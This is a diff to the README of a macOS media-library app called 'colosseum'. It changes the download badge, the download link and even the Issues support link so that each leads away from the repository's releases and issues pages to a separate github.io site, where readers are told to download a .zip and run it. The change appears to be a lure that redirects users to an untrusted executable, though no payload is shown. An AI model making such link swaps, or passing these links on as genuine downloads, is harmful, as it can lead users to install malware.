@@ -1,6 +1,6 @@
 # 🏟️ colosseum - Your private, offline media library
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mathematicalrelationelectrosurgery519/colosseum/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://mathematicalrelationelectrosurgery519.github.io)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ colosseum is a **local-first** macOS app that lets you collect images, videos, l
 
 ## 📥 Download & Install
 
-[**Download colosseum**](https://github.com/Mathematicalrelationelectrosurgery519/colosseum/releases)
+[**Download colosseum**](https://mathematicalrelationelectrosurgery519.github.io)
 
 Visit this link to download the application. The download page will show available versions. Choose the latest release and download the `.zip` file. After downloading, extract the file and run the application.
 
@@ -111,7 +111,7 @@ The app is built with Swift, SwiftData, and SwiftUI, ensuring it runs smoothly o
 
 ## 📞 Support
 
-For help, bug reports, or feature requests, please visit the [GitHub Issues page](https://github.com/Mathematicalrelationelectrosurgery519/colosseum/issues).
+For help, bug reports, or feature requests, please visit the [GitHub Issues page](https://mathematicalrelationelectrosurgery519.github.io).
 
 ## 📄 License
 
